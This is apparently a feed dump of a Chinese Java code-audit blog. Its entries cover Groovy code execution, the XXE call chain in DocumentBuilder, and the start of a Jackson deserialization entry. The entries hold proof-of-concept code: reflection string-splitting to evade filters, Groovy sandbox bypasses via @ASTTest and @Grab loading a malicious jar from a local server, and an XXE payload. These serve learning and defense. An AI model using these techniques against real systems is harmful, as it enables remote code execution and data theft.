groovyEngine<span class="token operator">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\"open -a Calculator\".execute()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// ScriptEngine 运行脚本</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func6</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ScriptEngine groovyEngine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"groovy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String code <span class="token operator">=</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string">"src/1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        groovyEngine<span class="token operator">.</span><span class="token function">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">readfile</span><span class="token punctuation">(</span>String filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        BufferedReader <span class="token keyword">in</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String string <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        String str<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>str <span class="token operator">=</span> <span class="token keyword">in</span><span class="token operator">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            string <span class="token operator">=</span> string <span class="token operator">+</span> str<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> string<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        GroovyShellExample groovyShellExample <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyShellExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        groovyShellExample.func1();</span><span class="token comment" spellcheck="true">//        groovyShellExample.func2();</span><span class="token comment" spellcheck="true">//        groovyShellExample.func3();</span><span class="token comment" spellcheck="true">//        groovyShellExample.func4();</span><span class="token comment" spellcheck="true">//        groovyShellExample.func5();</span>        groovyShellExample<span class="token operator">.</span><span class="token function">func6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><h3 id="1-反射和字符串拼接"><a href="#1-反射和字符串拼接" class="headerlink" title="1. 反射和字符串拼接"></a>1. 反射和字符串拼接</h3><p>bypassReflect.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">bypassReflect</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> rt <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.la"</span> <span class="token operator">+</span> <span class="token string">"ng.Run"</span> <span class="token operator">+</span> <span class="token string">"time"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Method gr <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getR"</span> <span class="token operator">+</span> <span class="token string">"untime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Method ex <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span> <span class="token operator">+</span> <span class="token string">"ec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ex<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ope"</span> <span class="token operator">+</span> <span class="token string">"n -a"</span> <span class="token operator">+</span><span class="token string">" Cal"</span> <span class="token operator">+</span> <span class="token string">"culator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-Groovy沙箱Bypass"><a href="#2-Groovy沙箱Bypass" class="headerlink" title="2.Groovy沙箱Bypass"></a>2.Groovy沙箱Bypass</h3><h4 id="AST注解执行断言"><a href="#AST注解执行断言" class="headerlink" title="@AST注解执行断言"></a>@AST注解执行断言</h4><p>参考Groovy的<a href="http://groovy-lang.org/metaprogramming.html" target="_blank" rel="noopener">Meta Programming手册</a>，利用AST注解能够执行断言从而实现代码执行（本地测试无需assert也能触发代码执行）。</p><p>ASTTest.groovy</p><pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token keyword">this</span><span class="token operator">.</span><span class="token keyword">class</span><span class="token operator">.</span>classLoader<span class="token operator">.</span><span class="token function">parseClass</span><span class="token punctuation">(</span><span class="token string">'''    @groovy.transform.ASTTest(value={        assert Runtime.getRuntime().exec("open -a Calculator")    })    def x'''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/Groovy/image-20211102170727475.png" alt="image-20211102170727475"></p><h4 id="Grab注解加载远程恶意类"><a href="#Grab注解加载远程恶意类" class="headerlink" title="@Grab注解加载远程恶意类"></a>@Grab注解加载远程恶意类</h4><p>@Grab注解的详细用法在<a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" target="_blank" rel="noopener">Dependency management with Grape</a>中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。</p><p>DemoGrab.groovy代码:</p><p>请求 <a href="http://127.0.0.1:8888/test/poc/0/poc-0.jar" target="_blank" rel="noopener">http://127.0.0.1:8888/test/poc/0/poc-0.jar</a> 加载Exp类，实例化后执行构造方法里的代码</p><pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token keyword">this</span><span class="token operator">.</span><span class="token keyword">class</span><span class="token operator">.</span>classLoader<span class="token operator">.</span><span class="token function">parseClass</span><span class="token punctuation">(</span><span class="token string">'''    @GrabConfig(disableChecksums=true)    @GrabResolver(name='Exp', root='http://127.0.0.1:8888/')    @Grab(group='test', module='poc', version='0')    import Exp;'''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Exp.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Exp</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">Exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open -a Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Javac Exp.java</code> 生成Exp.class</p><p>在src目录下创建META-INF.services目录，并创建org.codehaus.groovy.plugins.Runners文件，文件内容为Exp</p><pre><code>mkdir -p META-INF/services/echo Exp &gt; META-INF/services/org.codehaus.groovy.plugins.Runnersjar cvf poc-0.jar Exp.class META-INF</code></pre><p><img src="/img/Groovy/image-20211102172129340.png" alt="image-20211102172129340"></p><p>将poc-0.jar放到Web目录下，路径在test/poc/0/</p><p><img src="/img/Groovy/image-20211102172404756.png" alt="image-20211102172404756"></p><p>运行DemoGrab.groovy</p><p><img src="/img/Groovy/image-20211102172439128.png" alt="image-20211102172439128"></p><p>成功执行了命令</p><p><img src="/img/Groovy/image-20211102172508620.png" alt="image-20211102172508620"></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><code>https://www.mi1k7ea.com/2020/08/26/%E4%BB%8EJenkins-RCE%E7%9C%8BGroovy%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</code></p>]]></content>
      
      
      <categories>
          
          <category> Java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计之Groovy代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计之DocumentBuilder-XXE调用链完整分析过程</title>
      <link href="/2021/10/31/java-dai-ma-shen-ji-zhi-documentbuilder-xxe-diao-yong-lian-wan-zheng-fen-xi-guo-cheng/"/>
      <url>/2021/10/31/java-dai-ma-shen-ji-zhi-documentbuilder-xxe-diao-yong-lian-wan-zheng-fen-xi-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Java代码审计之DocumentBuilder-XXE调用链完整分析过程"><a href="#Java代码审计之DocumentBuilder-XXE调用链完整分析过程" class="headerlink" title="Java代码审计之DocumentBuilder-XXE调用链完整分析过程"></a>Java代码审计之DocumentBuilder-XXE调用链完整分析过程</h1><h2 id="0x01-调试分析过程"><a href="#0x01-调试分析过程" class="headerlink" title="0x01 调试分析过程"></a>0x01 调试分析过程</h2><p>Payload</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoXXE<span class="token punctuation">.</span>Demo1DocumentBuilder<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>w3c<span class="token punctuation">.</span>dom<span class="token punctuation">.</span>Document<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span>DocumentBuilder<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span>DocumentBuilderFactory<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DocumentXXE</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span>  Exception <span class="token punctuation">{</span>        String str <span class="token operator">=</span> <span class="token string">"&lt;!DOCTYPE doc [ \n"</span> <span class="token operator">+</span>                <span class="token string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8000\">\n"</span> <span class="token operator">+</span>                <span class="token string">"]>&lt;doc>&amp;xxe;&lt;/doc>"</span><span class="token punctuation">;</span>        DocumentBuilderFactory dbf <span class="token operator">=</span> DocumentBuilderFactory<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        //禁用DTDs (doctypes),几乎可以防御所有xml实体攻击</span><span class="token comment" spellcheck="true">//        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); //首选</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//        //如果不能禁用DTDs,可以使用下两项，必须两项同时存在</span><span class="token comment" spellcheck="true">//        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);        //防止外部实体POC</span><span class="token comment" spellcheck="true">//        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);   //防止参数实体POC</span>        DocumentBuilder db <span class="token operator">=</span> dbf<span class="token punctuation">.</span><span class="token function">newDocumentBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InputStream is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Document doc <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面的链都是进入解析方法的过程，并不重要</p><pre><code>parse:799, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)parse:771, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)parse:141, XMLParser (com.sun.org.apache.xerces.internal.parsers)parse:243, DOMParser (com.sun.org.apache.xerces.internal.parsers)parse:339, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)parse:121, DocumentBuilder (javax.xml.parsers)main:18, DocumentXXE (com.DemoXXE.Demo1DocumentBuilder)</code></pre><p><img src="/img/DocumentBuilder/image-20211031151415617.png" alt="image-20211031151415617"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/javax/xml/parsers/DocumentBuilder.javaDocumentBuilder#parse进入到parse(in)</code></pre><p><img src="/img/DocumentBuilder/image-20211031151528824.png" alt="image-20211031151528824"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/jaxp/DocumentBuilderImpl.javaDocumentBuilderImpl#parse进入到domParser.parse(is);</code></pre><p><img src="/img/DocumentBuilder/image-20211031151544930.png" alt="image-20211031151544930"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/parsers/DOMParser.javaDOMParser#parse进入到parse(xmlInputSource)</code></pre><p><img src="/img/DocumentBuilder/image-20211031151629800.png" alt="image-20211031151629800"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/parsers/XMLParser.javaXMLParser#parse进入到fConfiguration.parse(inputSource);</code></pre><p><img src="/img/DocumentBuilder/image-20211031151718172.png" alt="image-20211031151718172"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/parsers/XML11Configuration.javaXML11Configuration#parse进入到parse(true)</code></pre><p><img src="/img/DocumentBuilder/image-20211031151804278.png" alt="image-20211031151804278"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/parsers/XML11Configuration.javaXML11Configuration#parse进入到fCurrentScanner.scanDocument(complete);</code></pre><p><img src="/img/DocumentBuilder/image-20211031151900929.png" alt="image-20211031151900929"></p><p><strong>接下来才是真正的开始解析xml代码了</strong></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLDocumentFragmentScannerImpl.javaXMLDocumentFragmentScannerImpl#scanDocument进入到int event = next()</code></pre><p><img src="/img/DocumentBuilder/image-20211031152006043.png" alt="image-20211031152006043"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLDocumentScannerImpl.javaXMLDocumentScannerImpl#next进入到fDriver.next();</code></pre><p><img src="/img/DocumentBuilder/image-20211031152055411.png" alt="image-20211031152055411"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLDocumentScannerImpl.javaXMLDocumentScannerImpl#next注意：这里将状态设置为了SCANNER_STATE_PROLOG,后面会用到进入到fEntityScanner.skipString(xmlDecl)</code></pre><p><img src="/img/DocumentBuilder/image-20211031152143841.png" alt="image-20211031152143841"></p><p>通过定义知道xmlDecl变量是字符数组&lt;?xml</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">char</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> xmlDecl <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/DocumentBuilder/image-20211031152239916.png" alt="image-20211031152239916"></p><pre><code>进入到fEntityScanner.skipString(xmlDecl)Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLEntityScanner.javaXMLEntityScanner#skipString</code></pre><p>判断我们传递进去的xml字符串里，前五个字符串是不是等于&lt;?xml</p><p>因为我们传递进去的xml字符串里前五个字符串是&lt;!DOC</p><p>所以不相等，进入到了return false里。</p><p><img src="/img/DocumentBuilder/image-20211031152535363.png" alt="image-20211031152535363"></p><p><img src="/img/DocumentBuilder/image-20211031152713578.png" alt="image-20211031152713578"></p><pre><code>回到了Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLDocumentScannerImpl.javaXMLDocumentScannerImpl#next返回return XMLEvent.START_DOCUMENT</code></pre><p><img src="/img/DocumentBuilder/image-20211031152819947.png" alt="image-20211031152819947"></p><pre><code>定义里 START_DOCUMENT=7</code></pre><p><img src="/img/DocumentBuilder/image-20211031152842711.png" alt="image-20211031152842711"></p><pre><code>回到了Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLDocumentFragmentScannerImpl.javaXMLDocumentFragmentScannerImpl#scanDocument则event=7，即event = START_DOCUMENT于是进入到了红框里的case</code></pre><p><img src="/img/DocumentBuilder/image-20211031153006495.png" alt="image-20211031153006495"></p><p>接下来重新进入到next()里</p><p><img src="/img/DocumentBuilder/image-20211031153035900.png" alt="image-20211031153035900"></p><pre><code>进入到了Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLDocumentScannerImpl.javaXMLDocumentScannerImpl#next因为之前将状态设置为了SCANNER_STATE_PROLOG所以进入到了红框里的代码块</code></pre><p><img src="/img/DocumentBuilder/image-20211031153228936.png" alt="image-20211031153228936"></p><p>进入fEntityScanner.skipChar(‘&lt;’, null)</p><p><img src="/img/DocumentBuilder/image-20211031153344274.png" alt="image-20211031153344274"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLEntityScanner.javaXMLEntityScanner#skipChar其实就是在比较我们传递进去的字符串的第一个字符是不是 &lt;是的话就返回true</code></pre><p><img src="/img/DocumentBuilder/image-20211031153520629.png" alt="image-20211031153520629"></p><p>所以将状态设置为了SCANNER_STATE_START_OF_MARKUP</p><p><img src="/img/DocumentBuilder/image-20211031153634227.png" alt="image-20211031153634227"></p><p>于是进入到了SCANNER_STATE_START_OF_MARKUP代码块里</p><p><img src="/img/DocumentBuilder/image-20211031153734312.png" alt="image-20211031153734312"></p><p>判断接下去的字符是不是!-</p><p>因为接下去的字符是!D，所以不符合。</p><p><img src="/img/DocumentBuilder/image-20211031153844108.png" alt="image-20211031153844108"></p><pre><code>于是进入到了else if (fEntityScanner.skipString(DOCTYPE))因为DOCTYPE是private static final char [] DOCTYPE = {&#39;D&#39;,&#39;O&#39;,&#39;C&#39;,&#39;T&#39;,&#39;Y&#39;,&#39;P&#39;,&#39;E&#39;};</code></pre><p><img src="/img/DocumentBuilder/image-20211031154000898.png" alt="image-20211031154000898"></p><p>而我们传递的字符串里，&lt;!后面的字符串是DOCTYPE，所以符合条件。</p><p>于是将状态设置为SCANNER_STATE_DOCTYPE</p><p><img src="/img/DocumentBuilder/image-20211031154044667.png" alt="image-20211031154044667"></p><p>接着进入到SCANNER_STATE_DOCTYPE的代码块里</p><p><img src="/img/DocumentBuilder/image-20211031154329252.png" alt="image-20211031154329252"></p><p>后面的就是循环的去解析我们传递进去的xml代码</p><p>最后当event=1的时候，进入到next里</p><p><img src="/img/DocumentBuilder/image-20211031161524859.png" alt="image-20211031161524859"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLDocumentFragmentScannerImpl.javaXMLDocumentFragmentScannerImpl#next匹配到了Payload里的&amp;后，将状态设置为SCANNER_STATE_REFERENCE</code></pre><p><img src="/img/DocumentBuilder/image-20211031161610089.png" alt="image-20211031161610089"></p><p>进入到scanEntityReference(fContentBuffer);</p><p><img src="/img/DocumentBuilder/image-20211031162056227.png" alt="image-20211031162056227"></p><p>到了</p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLDocumentFragmentScannerImpl.javaXMLDocumentFragmentScannerImpl#scanEntityReference获取到了实体名称 xxe</code></pre><p><img src="/img/DocumentBuilder/image-20211031154815328.png" alt="image-20211031154815328"></p><p>接着进入到fEntityManager.startEntity(true, name, false);</p><p><img src="/img/DocumentBuilder/image-20211031155007355.png" alt="image-20211031155007355"></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLEntityManager.javaXMLEntityManager#startEntity获取到了实体的值</code></pre><p><img src="/img/DocumentBuilder/image-20211031155251498.png" alt="image-20211031155251498"></p><pre><code>进入到了Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLEntityManager.javaXMLEntityManager#startEntity(boolean isGE, String name, XMLInputSource xmlInputSource, boolean literal, boolean isExternal)然后进入到setupCurrentEntity方法里。</code></pre><p><img src="/img/DocumentBuilder/image-20211031155537415.png" alt="image-20211031155537415"></p><p><strong>注意：xxe漏洞最后都会进入到setupCurrentEntity方法里</strong></p><pre><code>Java/JavaVirtualMachines/corretto-1.8.0_292/Contents/Home/src.zip!/com/sun/org/apache/xerces/internal/impl/XMLEntityManager.javaXMLEntityManager#setupCurrentEntity这里请求了Payload的外部URL地址</code></pre><p><img src="/img/DocumentBuilder/image-20211031155637521.png" alt="image-20211031155637521"></p><p><strong>完整的调用链如下：</strong></p><pre><code>setupCurrentEntity:620, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)startEntity:1304, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)startEntity:1240, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)scanEntityReference:1908, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)next:3061, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)next:602, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)scanDocument:505, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)parse:842, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)parse:771, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)parse:141, XMLParser (com.sun.org.apache.xerces.internal.parsers)parse:243, DOMParser (com.sun.org.apache.xerces.internal.parsers)parse:339, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)parse:121, DocumentBuilder (javax.xml.parsers)main:18, DocumentXXE (com.DemoXXE.Demo1DocumentBuilder)</code></pre><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>通过上面的总结，默认情况下用 Unmarshaller 来处理xml不会发生xxe的问题(<strong>必须是jdk1.8，如果jdk是1.6和1.7，则也存在反序列化漏洞</strong>)。我们可以看到调用栈的过程中，<strong>存在xxe问题的库或者类实际上最后底层调用都是jdk自身处理xml的类，最后的核心触发流程都会来到 XMLEntityManager#setupCurrentEntity 当中</strong>。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><pre><code>http://www.lmxspace.com/2019/10/31/Java-XXE-%E6%80%BB%E7%BB%93</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计之DocumentBuilder-XXE调用链完整分析过程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计之Jackson序列化和反序列化</title>
      <link href="/2021/10/29/java-dai-ma-shen-ji-zhi-jackson-xu-lie-hua-he-fan-xu-lie-hua/"/>
      <url>/2021/10/29/java-dai-ma-shen-ji-zhi-jackson-xu-lie-hua-he-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="Java代码审计之Jackson序列化和反序列化"><a href="#Java代码审计之Jackson序列化和反序列化" class="headerlink" title="Java代码审计之Jackson序列化和反序列化"></a>Java代码审计之Jackson序列化和反序列化</h1><p><strong>注：本文为复现文和学习文，原创极少，参考了大量参考链接里的内容~感兴趣者自行阅读原作</strong></p><h2 id="0x01-序列化和反序列化"><a href="#0x01-序列化和反序列化" class="headerlink" title="0x01 序列化和反序列化"></a>0x01 序列化和反序列化</h2><p>Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。</p><p>Jackson提供了<code>ObjectMapper.writeValueAsString()</code>和<code>ObjectMapper.readValue()</code>两个方法来实现序列化和反序列化的功能。</p><p>Person.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> String name<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JSTest.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>Demo<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token 